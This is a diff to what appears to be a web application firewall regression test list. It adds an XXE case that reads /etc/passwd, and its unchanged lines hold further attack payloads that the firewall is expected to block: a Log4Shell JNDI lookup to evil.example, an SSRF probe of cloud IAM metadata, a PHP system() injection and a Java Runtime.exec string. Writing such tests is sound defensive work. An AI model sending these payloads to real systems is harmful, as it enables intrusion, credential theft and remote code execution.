@@ -49,6 +49,9 @@ ATTACKS = [
     Case("Log4Shell", "rce", "GET", "/", 403, headers={"User-Agent": "${jndi:ldap://evil.example/a}"}),
     # Server-side request forgery
     Case("SSRF cloud metadata", "ssrf", "GET", "/api/fetch", 403, params={"url": "http://169.254.169.254/latest/meta-data/iam/"}),
+    # XML external entity (local rule 10030, found missing with GoTestWAF)
+    Case("XXE in an XML body", "xxe", "POST", "/import", 403, headers={"Content-Type": "application/xml"},
+         data='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'),
     # PHP and Java
     Case("PHP code injection", "php", "GET", "/api/search", 403, params={"q": "<?php system($_GET['c']); ?>"}),
     Case("Java deserialization gadget", "java", "POST", "/api/comments", 403, json={"text": "java.lang.Runtime.getRuntime().exec('id')"}),
